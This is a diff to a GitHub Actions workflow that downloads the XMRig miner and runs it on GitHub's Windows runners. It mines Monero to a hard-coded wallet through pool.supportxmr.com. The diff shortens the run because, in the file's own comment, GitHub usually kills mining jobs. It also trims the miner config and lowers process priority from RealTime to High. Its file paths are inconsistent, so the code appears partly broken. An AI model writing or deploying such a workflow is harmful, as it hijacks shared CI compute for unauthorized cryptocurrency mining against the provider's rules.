@@ -1,4 +1,4 @@
-name: Windows XMRig Miner (Max Performance)
+name: Windows XMRig Miner (Optimized)
 
 on:
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
 jobs:
   mine:
     runs-on: windows-latest
-    timeout-minutes: 355  # Maximum allowed runtime
+    timeout-minutes: 30  # GitHub usually kills mining jobs within minutes
     steps:
       - name: Generate random worker name
         id: worker
@@ -19,7 +19,7 @@ jobs:
           Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip" -OutFile "xmrig.zip"
           Expand-Archive -Path "xmrig.zip" -DestinationPath .
           Rename-Item -Path "xmrig-6.21.0" -NewName "xmrig"
-          cd xmrig
+          
           # Create optimized config.json
           @'
           {
@@ -30,72 +30,29 @@ jobs:
               "hw-aes": true,
               "priority": 5,
               "asm": true,
-              "argon2-impl": null,
-              "argon2": [0, 1, 2, 3],
-              "cn/0": false,
-              "cn-lite/0": false,
-              "rx": [0, 1, 2, 3],
-              "rx/wow": [0, 1, 2, 3],
-              "cn-pico": [0, 1, 2, 3],
-              "cn-heavy/0": false,
-              "cn-heavy/tube": false,
-              "cn-heavy/xhv": false,
-              "cn/1": false,
-              "cn/2": false,
-              "cn/r": false,
-              "cn/fast": false,
-              "cn/half": false,
-              "cn/xao": false,
-              "cn/rto": false,
-              "cn/rwz": false,
-              "cn/zls": false,
-              "cn/double": false,
-              "rx/arq": [0, 1, 2, 3],
-              "rx/keva": [0, 1, 2, 3],
-              "rx/0": false,
-              "rx/loki": false,
-              "rx/wow": false,
-              "rx/graft": false,
-              "rx/sfx": false,
               "max-threads-hint": 100,
-              "yield": false
+              "rx": [0,1,2,3]
             },
-            "opencl": false,
-            "cuda": false,
             "donate-level": 1,
-            "log-file": null,
             "pools": [
               {
-                "algo": "rx/0",
-                "coin": "monero",
+                "algo": "rx",
                 "url": "pool.supportxmr.com:3333",
                 "user": "85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS",
                 "pass": "${{ steps.worker.outputs.name }}",
-                "rig-id": "${{ steps.worker.outputs.name }}",
-                "nicehash": false,
                 "keepalive": true,
-                "enabled": true,
-                "tls": false,
-                "tls-fingerprint": null,
-                "daemon": false,
-                "socks5": null,
-                "self-select": null
+                "tls": false
               }
             ]
           }
-          '@ | Out-File -FilePath "config.json" -Encoding utf8
+          '@ | Out-File -FilePath "$env:USERPROFILE\miner\xmrig\config.json" -Encoding utf8
 
-      - name: Run XMRig (Max Performance)
+      - name: Run XMRig (Optimized)
         run: |
           cd $env:USERPROFILE\miner\xmrig
-          # Set high priority and disable power saving
-          Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow -PassThru
-          timeout /t 5 > $null
+          Start-Process -FilePath ".\xmrig.exe" -ArgumentList "--config=config.json" -NoNewWindow
+          timeout /t 5
           $xmrProcess = Get-Process xmrig -ErrorAction SilentlyContinue
           if ($xmrProcess) {
-              $xmrProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime
-              # Disable CPU throttling (requires admin, may fail on GitHub)
-              powercfg /setactive SCHEME_MIN
-              powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100
-              powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PERFBOOSTMODE 2
+              $xmrProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
           }
